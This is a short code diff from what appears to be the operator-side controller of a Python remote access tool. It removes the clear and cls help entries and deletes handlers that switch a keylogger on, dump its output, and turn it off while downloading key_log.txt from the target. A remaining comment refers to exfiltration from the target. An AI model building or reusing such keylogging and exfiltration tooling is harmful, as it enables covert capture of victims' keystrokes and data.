@@ -153,10 +153,6 @@ List of available Commands:
 
 exit                          :    To terminate session
 
-clear (linux)                 :    To clear screen
-
-cls (windows)                 :    To clear screen
-
 mkdir <directory>
 (linux/windows)               :    To make folders
 
@@ -288,30 +284,6 @@ You can also use other commands related to networking, etc for linux as well as 
 		elif cmd[:4] == "ls_h" and len(cmd) > 1:
 
 			os.system("dir")
-
-
-                # keylogger on
-		elif cmd[:9] == 'keylog_on' and len(cmd) > 1:
-
-			result = recv_eff()
-			print(result)
-
-                # keylog dump
-		elif cmd[:11] == 'keylog_dump' and len(cmd) > 1:
-
-			result1 = recv_eff()
-			print(result1)
-
-			result2 = recv_eff()
-			print(result2)
-
-		# keylogger off and self destruct
-		elif cmd[:6] == 'keylog_off' and len(cmd) > 1:
-
-			result = recv_eff()
-			print(result)
-
-			download_file('key_log.txt')
 
 
 		# Exfiltration in trgt point of view  ✓
